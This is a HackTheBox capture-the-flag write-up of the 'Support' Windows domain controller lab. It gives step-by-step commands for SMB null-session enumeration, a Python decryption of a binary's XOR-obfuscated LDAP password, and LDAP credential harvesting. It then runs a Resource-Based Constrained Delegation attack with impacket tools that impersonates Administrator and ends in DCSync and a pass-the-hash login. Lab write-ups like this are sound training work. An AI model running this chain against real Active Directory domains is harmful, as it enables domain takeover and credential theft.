# HackTheBox — Support | Full Writeup

> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Easy
> **Category:** Active Directory / Windows
> **Date:** 2026-03-27

---

## Table of Contents

1. [TL;DR](#tldr)
2. [Recon](#recon)
3. [SMB Enumeration — support-tools Share](#smb-enumeration--support-tools-share)
4. [.NET Binary Analysis — UserInfo.exe](#net-binary-analysis--userinfoexe)
5. [LDAP Authenticated Enumeration](#ldap-authenticated-enumeration)
6. [Initial Access — WinRM](#initial-access--winrm)
7. [Privilege Escalation — RBCD via GenericAll on DC$](#privilege-escalation--rbcd-via-genericall-on-dc)
8. [Attack Chain](#attack-chain)
9. [Tools Used](#tools-used)
10. [Vulnerabilities Exploited](#vulnerabilities-exploited)
11. [What Failed — Dead Ends](#what-failed--dead-ends)
12. [Key Takeaways](#key-takeaways)

---

## TL;DR

Support is an Easy HTB Windows machine running a full Active Directory Domain Controller with no HTTP attack surface. A null SMB session exposes a non-standard share containing a custom .NET binary with hardcoded LDAP credentials obfuscated by a XOR cipher. Parsing the binary's .NET metadata heap and reversing the decryption algorithm yields a service account password. Authenticated LDAP enumeration then reveals a second account's password stored in plaintext in a user attribute, which has WinRM access. From the shell, the user's group membership grants `GenericAll` on the DC computer object. Combined with the default `SeMachineAccountPrivilege`, a Resource-Based Constrained Delegation attack is used to create a fake machine account, configure delegation rights on the DC, obtain a Kerberos service ticket as Administrator via S4U2Proxy, and DCSync the domain.

---

## Recon

### Port Scan

```bash
nmap -sV -sC -T4 --open <TARGET>
```

```
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb)
445/tcp open  microsoft-ds?
Service Info: Host: DC; OS: Windows
```

**Thought process:** Classic Windows Domain Controller fingerprint — DNS, Kerberos, LDAP, SMB, no HTTP. With no web attack surface, focus shifts entirely to AD enumeration. Priority: (1) SMB null session, (2) LDAP anonymous bind, (3) Kerberos user enumeration.

---

## SMB Enumeration — support-tools Share

### Null Session Share Listing

```bash
smbclient -L //<TARGET> -N
```

```
Sharename       Type    Comment
---------       ----    -------
ADMIN$          Disk    Remote Admin
C$              Disk    Default share
IPC$            IPC     Remote IPC
NETLOGON        Disk    Logon server share
support-tools   Disk    support staff tools
SYSVOL          Disk    Logon server share
```

**Thought process:** Five standard DC shares plus one non-standard: `support-tools`. Custom internal shares often contain tooling with hardcoded credentials.

### Browsing the Share

```bash
smbclient //<TARGET>/support-tools -N
smb: \> ls
smb: \> get UserInfo.exe.zip
```

| File | Notes |
| --- | --- |
| 7-ZipPortable, Notepad++, PuTTY, Sysinternals, Wireshark | Known public tools |
| **UserInfo.exe.zip (277 KB)** | **Custom — not a known public tool** |

**Key finding:** Every file is a known public tool except `UserInfo.exe.zip`. Its small size and name imply it queries AD for user information — likely containing LDAP bind credentials.

---

## .NET Binary Analysis — UserInfo.exe

### Identifying the Binary

```bash
file UserInfo.exe
# PE32 executable (console) Intel 80386 Mono/.Net assembly
```

**Thought process:** .NET assembly — string literals are stored as UTF-16 in the `#US` (User Strings) metadata heap. `strings` won't reliably find them. Need to parse the PE metadata directly.

### Extracting the #US Heap

.NET PE files have a metadata root identified by the `BSJB` magic signature. The `#US` stream contains all UTF-16 string literals used in the code.

```python
# Parse BSJB metadata root → walk stream directory → read #US heap
# Output includes:
#   <base64 ciphertext>     ← enc_password
#   <key string>            ← XOR key
#   'LDAP://support.htb'    ← LDAP target
#   'support\\ldap'         ← username
```

### Reversing getPassword()

IL bytecode analysis of the `Protected` class confirms the algorithm:

```
plaintext[i] = ciphertext[i]  XOR  key[i % key.length]  XOR  223
```

```python
import base64
enc = base64.b64decode("<ciphertext>")
key = b"<key>"
dec = bytes(b ^ key[i % len(key)] ^ 223 for i, b in enumerate(enc))
print(dec.decode())   # → LDAP service account password
```

**Why earlier attempts failed:** XOR with the key alone produces garbage. The constant 223 appears only as an IL opcode operand — invisible in the string heap.

---

## LDAP Authenticated Enumeration

```bash
ldapsearch -x -H ldap://<TARGET> \
  -D "support\ldap" -w '<password>' \
  -b "DC=support,DC=htb" "(objectClass=user)" 2>/dev/null
```

**Key finding:** `support` account is in `Remote Management Users` (WinRM) and `Shared Support Accounts`.

### Full Attribute Dump

```bash
ldapsearch -x -H ldap://<TARGET> \
  -D "support\ldap" -w '<password>' \
  -b "DC=support,DC=htb" "(sAMAccountName=support)" 2>/dev/null
```

```
info: <plaintext_password>
memberOf: CN=Shared Support Accounts,...
memberOf: CN=Remote Management Users,...
```

**Thought process:** Always dump ALL attributes. LDAP `info`, `description`, and `comment` are common password stash locations in CTF and misconfigured environments.

---

## Initial Access — WinRM

```bash
evil-winrm -i <TARGET> -u support -p '<password>'
# *Evil-WinRM* PS C:\Users\support\Documents>
```

---

## Privilege Escalation — RBCD via GenericAll on DC$

### Enumerating Privileges

```powershell
whoami /all
```

- `SeMachineAccountPrivilege` — enabled (default for all domain users)
- Member of `Shared Support Accounts`

### BloodHound — Confirming the ACL Path

```bash
bloodhound-python -d support.htb -u support -p '<password>' \
  -dc DC.support.htb -ns <TARGET> -c all --zip
```

**Confirmed:** `Shared Support Accounts` → **GenericAll** → `DC$`

`GenericAll` allows writing `msDS-AllowedToActOnBehalfOfOtherIdentity` on the DC object, enabling RBCD. With `SeMachineAccountPrivilege` we can create the machine account needed as the delegation source.

### Step 1 — Create Fake Machine Account

```bash
addcomputer.py <domain>/support:'<password>' \
  -dc-ip <TARGET> -computer-name 'FAKE$' -computer-pass '<machine_pass>'
```

### Step 2 — Write RBCD Attribute on DC$

```bash
# impacket v0.13+ syntax
rbcd.py -delegate-from 'FAKE$' -delegate-to 'DC$' -action write \
  <domain>/support:'<password>' -dc-ip <TARGET>
```

### Step 3 — S4U2Proxy Ticket as Administrator

```bash
unset KRB5CCNAME
getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator \
  -dc-ip <TARGET> '<domain>/FAKE$:<machine_pass>'
```

### Step 4 — DCSync

```bash
export KRB5CCNAME='Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache'
secretsdump.py -k -no-pass dc.support.htb -just-dc-user Administrator
```

### Root

```bash
evil-winrm -i <TARGET> -u Administrator -H '<nt_hash>'
type C:\Users\Administrator\Desktop\root.txt
```

**Why RBCD works:** Writing `msDS-AllowedToActOnBehalfOfOtherIdentity` on `DC$` instructs the KDC to honour S4U2Proxy requests from `FAKE$` for any user. No consent required from the impersonated account — the trust is configured on the resource (DC$), not the user.

---

## Attack Chain

```
nmap → Windows DC, support.htb — 53/88/135/139/389/445
│
├── SMB null session → support-tools share
│   └── UserInfo.exe.zip — custom .NET binary
│       └── Parse #US heap → ciphertext + XOR key
│           └── Decrypt (key XOR + constant 223) → ldap creds
│
├── LDAP authenticated dump
│   └── support user info attribute → plaintext password → WinRM
│
├── evil-winrm → support shell → user.txt ✅
│   └── SeMachineAccountPrivilege + Shared Support Accounts
│       └── BloodHound → GenericAll on DC$
│
└── RBCD
    ├── addcomputer.py → FAKE$
    ├── rbcd.py → write delegation on DC$
    ├── getST.py → S4U2Proxy as Administrator
    └── secretsdump.py → NT hash → root.txt ✅
```

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service detection |
| `smbclient` | SMB null session, share enum, file download |
| `python3` | .NET #US heap parser + XOR decryption |
| `ldapsearch` | LDAP enumeration |
| `evil-winrm` | WinRM shell |
| `bloodhound-python` | AD ACL collection |
| `addcomputer.py` | Create fake machine account |
| `rbcd.py` | Write RBCD delegation attribute |
| `getST.py` | S4U2Proxy Kerberos ticket |
| `secretsdump.py` | DCSync |

---

## Vulnerabilities Exploited

| Vulnerability | Location | Impact |
| --- | --- | --- |
| Hardcoded credentials — XOR obfuscation | .NET binary in SMB share | LDAP service account access |
| Plaintext password in LDAP `info` attribute | AD user object | WinRM shell |
| GenericAll on DC$ via group ACL | Active Directory | Full RBCD → Domain Admin |

---

## What Failed — Dead Ends

| Approach | Why It Failed |
| --- | --- |
| LDAP anonymous bind | Server requires authenticated bind |
| `strings` on .NET binary | UTF-16 strings in #US heap — not visible to standard strings |
| XOR with key alone | Missing constant 223 — only visible in IL bytecode |
| `ilspycmd` decompiler | Requires .NET 8, only .NET 6 available |
| `rbcd.py -f/-t` | Flags deprecated in impacket v0.13 |
| `getST.py` with KRB5CCNAME set | Stale env var — must `unset KRB5CCNAME` first |

---

## Key Takeaways

**1. Non-standard SMB shares are high-value targets**
On AD boxes without HTTP, enumerate SMB null sessions immediately. Any share outside the standard set is worth investigating — custom tooling frequently contains hardcoded credentials.

**2. .NET binaries require metadata-level analysis**
String literals live in the `#US` heap as UTF-16 — invisible to `strings`. Parse the PE metadata directly to find credentials and encryption keys.

**3. LDAP — always dump ALL attributes**
Pull everything with no attribute filter. The `info`, `description`, and `comment` fields are common credential hiding spots.

**4. SeMachineAccountPrivilege + GenericAll on computer = RBCD = Domain Admin**
`SeMachineAccountPrivilege` is granted to all domain users by default. If any group has `GenericAll` on a DC object, RBCD gives full domain compromise.

**5. Impacket v0.13 RBCD gotchas**
`rbcd.py`: `-f`/`-t` → `-delegate-from`/`-delegate-to`. Always `unset KRB5CCNAME` before `getST.py`.

---

*Written by k41r0s3 | HackTheBox | Support | Easy*
